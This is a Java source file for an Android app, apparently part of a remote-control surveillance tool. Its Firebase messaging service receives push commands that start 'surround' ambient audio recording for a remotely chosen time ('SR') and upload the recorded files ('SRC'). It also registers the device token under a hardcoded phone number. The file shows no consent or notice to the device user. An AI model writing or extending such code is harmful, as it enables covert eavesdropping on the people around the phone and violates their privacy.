package com.sai.intelligent.services;

import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.Data;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.sai.intelligent.utils.FirebaseUtils;

import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.TimeUnit;

public class MyFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "MyFirebaseMsgService";

    @Override
    public void onMessageReceived(@NonNull RemoteMessage remoteMessage) {
        Log.d(TAG, "From: " + remoteMessage.getFrom());

        if (remoteMessage.getData().size() > 0) {
            String command = remoteMessage.getData().get("command");
            handleCommand(command,Integer.parseInt(remoteMessage.getData().get("recordTime")));
            Log.d(TAG, "Message data payload: " + command);
        }

    }

    private void handleCommand(String command,int recordTime) {
        switch(command) {
            case "SR" : startSurroundRecording(recordTime);
                 break;
            case "SRC" : uploadSurroundRecordedFiles();
                 break;
            default: Log.d(TAG, "Given command not matched");
        }
    }

    private void uploadSurroundRecordedFiles() {

        WorkManager workManager =WorkManager.getInstance();

        OneTimeWorkRequest oneTimeWorkRequest = new OneTimeWorkRequest.Builder(ScheduleRecorderService.class)
                .build();

        workManager.enqueue(oneTimeWorkRequest);

        Log.d(TAG,"work allocated..!");

    }


    private void startSurroundRecording(int recordTime){
        Log.d(TAG,"Recieved record time: "+recordTime);
        Intent intent = new Intent(this,SurroundRecorderService.class);
        intent.putExtra("time",recordTime);
        SurroundRecorderService surroundRecorderService = new SurroundRecorderService();
        surroundRecorderService.enqueueWork(this,SurroundRecorderService.class,1,intent);
     //startForegroundService(intent);
     Log.d(TAG,"Surround recording initialized.");
    }

    @Override
    public void onNewToken(@NonNull String s) {
        FirebaseUtils.saveFCMToken("9704696945",s);
        Log.d(TAG,"Token saved to datastore");
    }
}
